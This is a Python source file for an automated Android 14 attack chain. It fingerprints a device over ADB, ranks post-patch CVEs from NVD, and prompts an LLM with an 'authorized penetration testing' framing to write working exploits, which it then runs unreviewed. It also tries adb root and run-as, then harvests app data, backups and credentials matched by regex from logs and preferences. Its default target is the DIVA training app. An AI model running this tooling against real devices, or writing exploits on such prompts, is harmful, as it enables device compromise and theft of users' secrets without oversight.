"""
Android 14 Attack Chain - Methodological Approach

A systematic attack chain that:
1. Deeply evaluates the target system
2. Queries NVD API for CVEs closest to the patch date (1-day vulnerabilities)
3. Prioritizes and executes exploits by likelihood of success
4. Extracts data through multiple vectors

For authorized security testing only.
"""

import json
import logging
import os
import re
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from pathlib import Path
from typing import Callable, Optional

logger = logging.getLogger(__name__)


class Phase(Enum):
    """Attack phases."""
    SYSTEM_EVALUATION = "system_evaluation"
    CVE_ANALYSIS = "cve_analysis"
    EXPLOIT_SELECTION = "exploit_selection"
    EXPLOITATION = "exploitation"
    DATA_EXTRACTION = "data_extraction"
    COMPLETED = "completed"
    FAILED = "failed"


@dataclass
class SystemProfile:
    """Comprehensive system profile from reconnaissance."""
    device_id: str
    android_version: str
    api_level: int
    security_patch: str
    security_patch_date: datetime
    kernel_version: str
    kernel_major: str
    architecture: str
    manufacturer: str
    model: str
    hardware: str
    selinux_status: str
    is_rooted: bool
    is_debuggable: bool
    installed_apps: list
    running_services: list
    open_ports: list
    backup_enabled: bool


@dataclass
class CVECandidate:
    """A CVE candidate for exploitation."""
    cve_id: str
    published_date: datetime
    days_after_patch: int  # How many days after patch date was this published
    cvss_score: float
    severity: str
    attack_vector: str
    has_poc: bool
    poc_urls: list
    description: str
    cwe_ids: list
    exploit_likelihood: float  # Calculated score 0-1


@dataclass
class ExploitResult:
    """Result of an exploitation attempt."""
    cve_id: str
    method: str
    success: bool
    output: str
    artifacts: dict = field(default_factory=dict)
    duration: float = 0.0


class Android14AttackChain:
    """
    Methodological attack chain for Android 14.

    Usage:
        chain = Android14AttackChain("127.0.0.1:6562")
        result = chain.execute(target_package="jakhar.aseem.diva")
    """

    def __init__(
        self,
        device_id: str,
        nvd_api_key: Optional[str] = None,
        llm_client=None,
        output_dir: str = "output/android14_chains",
    ):
        self.device_id = device_id
        self.nvd_api_key = nvd_api_key or os.getenv("NVD_API_KEY")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # LLM client for exploit generation
        if llm_client is None:
            from agent import LLMClient
            self.llm_client = LLMClient.create()
        else:
            self.llm_client = llm_client

        self.profile: Optional[SystemProfile] = None
        self.cve_candidates: list = []
        self.exploit_results: list = []
        self.extracted_data: dict = {}

    def execute(
        self,
        target_package: str,
        progress_callback: Optional[Callable] = None,
    ) -> dict:
        """Execute the full methodological attack chain."""
        start_time = time.time()
        results = {
            "phases": [],
            "success": False,
            "data_extracted": {},
            "cves_tested": [],
        }

        def report(phase: Phase, msg: str):
            if progress_callback:
                progress_callback(phase, msg)
            print(f"[{phase.value.upper()}] {msg}")

        try:
            # ═══════════════════════════════════════════════════════════════
            # PHASE 1: DEEP SYSTEM EVALUATION
            # ═══════════════════════════════════════════════════════════════
            report(Phase.SYSTEM_EVALUATION, "Starting deep system evaluation...")
            self.profile = self._evaluate_system()
            results["phases"].append({
                "phase": "system_evaluation",
                "success": True,
                "data": {
                    "android": self.profile.android_version,
                    "kernel": self.profile.kernel_version,
                    "patch_date": self.profile.security_patch,
                    "selinux": self.profile.selinux_status,
                    "rooted": self.profile.is_rooted,
                    "debuggable": self.profile.is_debuggable,
                }
            })
            report(Phase.SYSTEM_EVALUATION,
                f"Android {self.profile.android_version} | "
                f"Kernel {self.profile.kernel_major} | "
                f"Patch {self.profile.security_patch} | "
                f"SELinux: {self.profile.selinux_status}")

            # ═══════════════════════════════════════════════════════════════
            # PHASE 2: CVE ANALYSIS - Find 1-day vulnerabilities
            # ═══════════════════════════════════════════════════════════════
            report(Phase.CVE_ANALYSIS, "Querying NVD API for 1-day vulnerabilities...")
            self.cve_candidates = self._analyze_cves()
            results["phases"].append({
                "phase": "cve_analysis",
                "success": len(self.cve_candidates) > 0,
                "data": {
                    "total_cves": len(self.cve_candidates),
                    "with_poc": sum(1 for c in self.cve_candidates if c.has_poc),
                    "top_5": [
                        {
                            "cve": c.cve_id,
                            "days_after_patch": c.days_after_patch,
                            "cvss": c.cvss_score,
                            "likelihood": round(c.exploit_likelihood, 2),
                            "has_poc": c.has_poc,
                        }
                        for c in self.cve_candidates[:5]
                    ]
                }
            })

            if self.cve_candidates:
                best = self.cve_candidates[0]
                report(Phase.CVE_ANALYSIS,
                    f"Found {len(self.cve_candidates)} CVEs | "
                    f"Best: {best.cve_id} ({best.days_after_patch} days after patch, "
                    f"likelihood: {best.exploit_likelihood:.0%})")

            # ═══════════════════════════════════════════════════════════════
            # PHASE 3: EXPLOIT SELECTION AND EXECUTION
            # ═══════════════════════════════════════════════════════════════
            report(Phase.EXPLOITATION, "Executing exploitation strategy...")

            # Try multiple exploitation vectors
            exploitation_success = False

            # Vector 1: Kernel CVE exploitation
            if self.cve_candidates:
                for cve in self.cve_candidates[:3]:  # Try top 3
                    report(Phase.EXPLOITATION, f"Attempting {cve.cve_id}...")
                    result = self._exploit_cve(cve)
                    self.exploit_results.append(result)
                    if result.success:
                        exploitation_success = True
                        report(Phase.EXPLOITATION, f"✓ {cve.cve_id} successful!")
                        break

            # Vector 2: ADB root (emulator-specific)
            if not exploitation_success:
                report(Phase.EXPLOITATION, "Trying ADB root (emulator mode)...")
                result = self._try_adb_root()
                self.exploit_results.append(result)
                if result.success:
                    exploitation_success = True

            # Vector 3: Debuggable app exploitation
            if not exploitation_success and self.profile.is_debuggable:
                report(Phase.EXPLOITATION, "Trying debuggable app exploitation...")
                result = self._exploit_debuggable(target_package)
                self.exploit_results.append(result)
                if result.success:
                    exploitation_success = True

            results["phases"].append({
                "phase": "exploitation",
                "success": exploitation_success,
                "attempts": len(self.exploit_results),
                "successful_method": next(
                    (r.method for r in self.exploit_results if r.success), None
                )
            })

            # ═══════════════════════════════════════════════════════════════
            # PHASE 4: DATA EXTRACTION
            # ═══════════════════════════════════════════════════════════════
            report(Phase.DATA_EXTRACTION, f"Extracting data from {target_package}...")

            # Multiple extraction vectors
            self.extracted_data = self._extract_data(target_package, exploitation_success)

            results["phases"].append({
                "phase": "data_extraction",
                "success": len(self.extracted_data) > 0,
                "sources": list(self.extracted_data.keys()),
            })

            if self.extracted_data:
                report(Phase.DATA_EXTRACTION,
                    f"✓ Extracted from {len(self.extracted_data)} sources!")

            # ═══════════════════════════════════════════════════════════════
            # FINAL RESULTS
            # ═══════════════════════════════════════════════════════════════
            results["success"] = len(self.extracted_data) > 0
            results["data_extracted"] = self.extracted_data
            results["cves_tested"] = [r.cve_id for r in self.exploit_results if r.cve_id]
            results["total_duration"] = time.time() - start_time

            # Save results
            self._save_results(results)

            return results

        except Exception as e:
            logger.error(f"Attack chain failed: {e}")
            results["phases"].append({
                "phase": "failed",
                "error": str(e)
            })
            return results

    def _adb(self, cmd: str, timeout: int = 30) -> tuple[bool, str]:
        """Execute ADB shell command."""
        try:
            result = subprocess.run(
                ["adb", "-s", self.device_id, "shell", cmd],
                capture_output=True, text=True, timeout=timeout
            )
            return result.returncode == 0, result.stdout.strip()
        except subprocess.TimeoutExpired:
            return False, "timeout"
        except Exception as e:
            return False, str(e)

    def _evaluate_system(self) -> SystemProfile:
        """Deep system evaluation - Phase 1."""

        def prop(name: str) -> str:
            _, val = self._adb(f"getprop {name}")
            return val

        # Basic info
        android_version = prop("ro.build.version.release")
        api_level = int(prop("ro.build.version.sdk") or "0")
        security_patch = prop("ro.build.version.security_patch")

        # Parse patch date
        try:
            patch_date = datetime.strptime(security_patch, "%Y-%m-%d")
        except ValueError:
            patch_date = datetime.now() - timedelta(days=365)

        # Kernel info
        _, kernel_full = self._adb("uname -r")
        kernel_major = re.match(r"(\d+\.\d+)", kernel_full)
        kernel_major = kernel_major.group(1) if kernel_major else kernel_full[:10]

        # Architecture
        _, arch = self._adb("uname -m")
        if "aarch64" in arch or "arm64" in arch:
            arch = "arm64"
        elif "x86_64" in arch:
            arch = "x86_64"

        # SELinux
        _, selinux = self._adb("getenforce")

        # Root check
        _, id_output = self._adb("id")
        is_rooted = "uid=0" in id_output

        # Check if target app is debuggable
        _, debuggable = self._adb("getprop ro.debuggable")
        is_debuggable = debuggable == "1"

        # Installed third-party apps
        _, apps_output = self._adb("pm list packages -3")
        installed_apps = [
            line.replace("package:", "")
            for line in apps_output.split('\n') if line
        ]

        # Running services
        _, services = self._adb("dumpsys activity services | grep 'ServiceRecord' | head -20")
        running_services = services.split('\n') if services else []

        # Open ports (netstat)
        _, netstat = self._adb("netstat -tlnp 2>/dev/null | grep LISTEN")
        open_ports = []
        for line in netstat.split('\n'):
            if line:
                match = re.search(r':(\d+)\s', line)
                if match:
                    open_ports.append(int(match.group(1)))

        # Backup enabled
        _, backup = self._adb("getprop backup.enabled")
        backup_enabled = backup == "true"

        return SystemProfile(
            device_id=self.device_id,
            android_version=android_version,
            api_level=api_level,
            security_patch=security_patch,
            security_patch_date=patch_date,
            kernel_version=kernel_full,
            kernel_major=kernel_major,
            architecture=arch,
            manufacturer=prop("ro.product.manufacturer"),
            model=prop("ro.product.model"),
            hardware=prop("ro.hardware"),
            selinux_status=selinux.lower(),
            is_rooted=is_rooted,
            is_debuggable=is_debuggable,
            installed_apps=installed_apps,
            running_services=running_services,
            open_ports=open_ports,
            backup_enabled=backup_enabled,
        )

    def _analyze_cves(self) -> list[CVECandidate]:
        """
        Query NVD API for 1-day vulnerabilities - Phase 2.

        Finds CVEs published JUST AFTER the device's patch date,
        prioritized by exploit likelihood.
        """
        import requests

        candidates = []
        headers = {}
        if self.nvd_api_key:
            headers["apiKey"] = self.nvd_api_key

        base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"

        # Search queries targeting this device
        queries = [
            f"Android {self.profile.android_version}",
            f"Linux kernel {self.profile.kernel_major}",
            "Android privilege escalation",
            "Android binder",
        ]

        for query in queries:
            try:
                response = requests.get(
                    base_url,
                    headers=headers,
                    params={"keywordSearch": query, "resultsPerPage": 50},
                    timeout=60
                )

                if response.status_code != 200:
                    continue

                data = response.json()
                for item in data.get("vulnerabilities", []):
                    cve = self._parse_cve_for_analysis(item)
                    if cve and cve.cve_id not in [c.cve_id for c in candidates]:
                        candidates.append(cve)

            except Exception as e:
                logger.debug(f"Query '{query}' failed: {e}")

        # Sort by exploit likelihood
        candidates.sort(key=lambda c: c.exploit_likelihood, reverse=True)

        return candidates

    def _parse_cve_for_analysis(self, item: dict) -> Optional[CVECandidate]:
        """Parse CVE and calculate exploit likelihood."""
        try:
            cve = item.get("cve", {})
            cve_id = cve.get("id", "")
            published = cve.get("published", "")[:10]

            # Parse date
            try:
                pub_date = datetime.strptime(published, "%Y-%m-%d")
            except ValueError:
                return None

            # Must be after patch date to be a 1-day
            if pub_date <= self.profile.security_patch_date:
                return None

            days_after = (pub_date - self.profile.security_patch_date).days

            # Get CVSS
            metrics = cve.get("metrics", {})
            cvss_score = 0.0
            severity = "UNKNOWN"
            attack_vector = "NETWORK"

            if "cvssMetricV31" in metrics:
                cvss_data = metrics["cvssMetricV31"][0]["cvssData"]
                cvss_score = cvss_data.get("baseScore", 0)
                severity = cvss_data.get("baseSeverity", "UNKNOWN")
                attack_vector = cvss_data.get("attackVector", "NETWORK")

            # Need minimum severity
            if cvss_score < 7.0:
                return None

            # Get description
            descriptions = cve.get("descriptions", [])
            description = ""
            for d in descriptions:
                if d.get("lang") == "en":
                    description = d.get("value", "")
                    break

            # Check for PoC references
            poc_urls = []
            has_poc = False
            for ref in cve.get("references", []):
                url = ref.get("url", "")
                tags = ref.get("tags", [])
                if "Exploit" in tags or "github.com" in url:
                    poc_urls.append(url)
                    has_poc = True

            # Get CWE
            cwe_ids = []
            for weakness in cve.get("weaknesses", []):
                for desc in weakness.get("description", []):
                    val = desc.get("value", "")
                    if val.startswith("CWE-"):
                        cwe_ids.append(val)

            # Calculate exploit likelihood (0-1)
            # Factors:
            # - Days after patch (fewer = more likely unpatched)
            # - CVSS score (higher = more impactful)
            # - Attack vector (LOCAL = better for privilege escalation)
            # - PoC available (much better chance)

            likelihood = 0.0

            # Days factor (1-day = best, decays over time)
            if days_after <= 7:
                likelihood += 0.4
            elif days_after <= 30:
                likelihood += 0.3
            elif days_after <= 90:
                likelihood += 0.2
            else:
                likelihood += 0.1

            # CVSS factor
            likelihood += (cvss_score / 10.0) * 0.3

            # Attack vector factor
            if attack_vector == "LOCAL":
                likelihood += 0.2
            elif attack_vector == "ADJACENT_NETWORK":
                likelihood += 0.1

            # PoC factor (big boost)
            if has_poc:
                likelihood += 0.3

            return CVECandidate(
                cve_id=cve_id,
                published_date=pub_date,
                days_after_patch=days_after,
                cvss_score=cvss_score,
                severity=severity,
                attack_vector=attack_vector,
                has_poc=has_poc,
                poc_urls=poc_urls,
                description=description[:200],
                cwe_ids=cwe_ids,
                exploit_likelihood=min(likelihood, 1.0),
            )

        except Exception as e:
            logger.debug(f"CVE parse error: {e}")
            return None

    def _exploit_cve(self, cve: CVECandidate) -> ExploitResult:
        """Attempt to exploit a specific CVE."""
        start = time.time()

        if self.profile is None:
            return ExploitResult(
                cve_id=cve.cve_id,
                method="unknown",
                success=False,
                output="System profile not initialized",
                duration=0.0
            )

        # Generate exploit with LLM
        prompt = f"""Generate a working exploit for {cve.cve_id} on Android.

Target System:
- Device: {self.profile.manufacturer} {self.profile.model}
- Android: {self.profile.android_version} (API {self.profile.api_level})
- Kernel: {self.profile.kernel_version}
- Architecture: {self.profile.architecture}
- ADB ID: {self.device_id}
- SELinux: {self.profile.selinux_status}

CVE Details:
- ID: {cve.cve_id}
- CVSS: {cve.cvss_score} ({cve.severity})
- Attack Vector: {cve.attack_vector}
- CWE: {', '.join(cve.cwe_ids)}
- Description: {cve.description}

{"PoC References: " + ", ".join(cve.poc_urls[:2]) if cve.poc_urls else "No PoC available - generate from scratch."}

Requirements:
1. Use subprocess to run ADB commands
2. Target device: {self.device_id}
3. Goal: Achieve root (uid=0) OR access to /data/data/
4. Print "[EXPLOIT_SUCCESS]" if successful
5. Print "[EXPLOIT_FAILED]" if failed

Output ONLY executable Python code."""

        try:
            system = "You are an Android kernel security researcher. Generate working exploit code for authorized penetration testing."
            response = self.llm_client.complete(prompt, system=system)

            # Extract code
            code = response.content
            if "```python" in code:
                match = re.search(r"```python\n(.*?)```", code, re.DOTALL)
                if match:
                    code = match.group(1)
            elif "```" in code:
                match = re.search(r"```\n?(.*?)```", code, re.DOTALL)
                if match:
                    code = match.group(1)

            # Execute
            exploit_path = self.output_dir / f"exploit_{cve.cve_id.replace('-', '_')}.py"
            exploit_path.write_text(code)

            result = subprocess.run(
                ["python3", str(exploit_path)],
                capture_output=True, text=True, timeout=120,
                env={**os.environ, "DEVICE_ID": self.device_id}
            )

            output = result.stdout + result.stderr
            success = "[EXPLOIT_SUCCESS]" in output or "uid=0" in output

            # Verify with ADB
            if not success:
                _, id_out = self._adb("id")
                success = "uid=0" in id_out

            return ExploitResult(
                cve_id=cve.cve_id,
                method=f"cve_exploit_{cve.cve_id}",
                success=success,
                output=output[:500],
                artifacts={"code": code[:300]},
                duration=time.time() - start
            )

        except Exception as e:
            return ExploitResult(
                cve_id=cve.cve_id,
                method=f"cve_exploit_{cve.cve_id}",
                success=False,
                output=str(e),
                duration=time.time() - start
            )

    def _try_adb_root(self) -> ExploitResult:
        """Try ADB root (works on some emulators)."""
        start = time.time()

        try:
            # Try adb root
            subprocess.run(
                ["adb", "-s", self.device_id, "root"],
                capture_output=True, text=True, timeout=10
            )

            time.sleep(2)

            # Wait for device
            subprocess.run(
                ["adb", "-s", self.device_id, "wait-for-device"],
                timeout=10
            )

            # Check if root worked
            _, id_out = self._adb("id")
            success = "uid=0" in id_out

            return ExploitResult(
                cve_id="",
                method="adb_root",
                success=success,
                output=id_out,
                duration=time.time() - start
            )

        except Exception as e:
            return ExploitResult(
                cve_id="",
                method="adb_root",
                success=False,
                output=str(e),
                duration=time.time() - start
            )

    def _exploit_debuggable(self, package: str) -> ExploitResult:
        """Exploit debuggable app with run-as."""
        start = time.time()

        try:
            # Try run-as
            _, output = self._adb(f"run-as {package} id")
            success = "uid=" in output and "No such" not in output

            return ExploitResult(
                cve_id="",
                method="run_as_debuggable",
                success=success,
                output=output,
                duration=time.time() - start
            )

        except Exception as e:
            return ExploitResult(
                cve_id="",
                method="run_as_debuggable",
                success=False,
                output=str(e),
                duration=time.time() - start
            )

    def _extract_data(self, target_package: str, have_root: bool) -> dict:
        """Extract data through multiple vectors."""
        extracted = {}

        # Vector 1: Logcat (always works)
        _, logcat = self._adb(f"logcat -d | grep -i '{target_package}' | tail -100")
        if logcat:
            extracted["logcat"] = logcat

            # Look for credentials in logs
            creds = re.findall(
                r'(?:password|user|email|token|secret|key)[=:\s]+([^\s,\]"]+)',
                logcat, re.IGNORECASE
            )
            if creds:
                extracted["logcat_credentials"] = list(set(creds))

        # Vector 2: Root access
        if have_root:
            data_dir = f"/data/data/{target_package}"

            # Shared preferences
            _, prefs = self._adb(f"cat {data_dir}/shared_prefs/*.xml 2>/dev/null")
            if prefs and "No such file" not in prefs:
                extracted["shared_prefs"] = prefs

                # Extract sensitive values
                secrets = re.findall(
                    r'(?:password|passwd|pwd|key|secret|token|auth)[^>]*>([^<]+)<',
                    prefs, re.IGNORECASE
                )
                if secrets:
                    extracted["extracted_secrets"] = list(set(secrets))

            # Databases
            _, dbs = self._adb(f"ls {data_dir}/databases/ 2>/dev/null")
            if dbs and "No such file" not in dbs:
                extracted["databases"] = dbs.split('\n')

        # Vector 3: Backup extraction (if enabled)
        if self.profile.backup_enabled:
            # Try backup extraction
            try:
                backup_path = self.output_dir / f"{target_package}_backup.ab"
                subprocess.run(
                    ["adb", "-s", self.device_id, "backup", "-f",
                     str(backup_path), "-noapk", target_package],
                    timeout=30
                )
                if backup_path.exists() and backup_path.stat().st_size > 0:
                    extracted["backup_file"] = str(backup_path)
            except Exception:
                pass

        # Vector 4: Content providers
        _, providers = self._adb(
            f"content query --uri content://{target_package} 2>/dev/null"
        )
        if providers and "Unknown URI" not in providers:
            extracted["content_providers"] = providers

        return extracted

    def _save_results(self, results: dict) -> None:
        """Save attack chain results."""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = self.output_dir / f"attack_{ts}.json"

        # Make serializable
        output = json.loads(json.dumps(results, default=str))
        path.write_text(json.dumps(output, indent=2))
        logger.info(f"Results saved: {path}")


def run_android14_chain(device_id: str, target_package: str) -> dict:
    """Convenience function to run the Android 14 attack chain."""
    chain = Android14AttackChain(device_id)
    return chain.execute(target_package)


if __name__ == "__main__":
    import sys

    device_id = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:6562"
    target = sys.argv[2] if len(sys.argv) > 2 else "jakhar.aseem.diva"

    print("=" * 70)
    print("  ANDROID 14 METHODOLOGICAL ATTACK CHAIN")
    print("=" * 70)

    result = run_android14_chain(device_id, target)

    print("\n" + "=" * 70)
    print("  FINAL RESULTS")
    print("=" * 70)
    print(f"Success: {result.get('success')}")
    print(f"CVEs Tested: {result.get('cves_tested')}")
    print(f"Duration: {result.get('total_duration', 0):.1f}s")

    if result.get("data_extracted"):
        print("\nExtracted Data Sources:")
        for source in result["data_extracted"].keys():
            print(f"  - {source}")
